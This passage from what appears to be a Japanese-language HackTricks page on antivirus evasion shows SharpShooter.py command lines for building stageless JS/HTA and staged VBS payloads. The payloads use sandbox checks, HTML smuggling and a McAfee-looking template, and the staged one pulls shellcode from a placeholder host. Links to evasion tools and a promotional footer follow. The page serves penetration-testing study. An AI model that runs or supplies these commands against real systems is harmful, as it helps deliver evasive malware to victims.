SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### もっと

{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
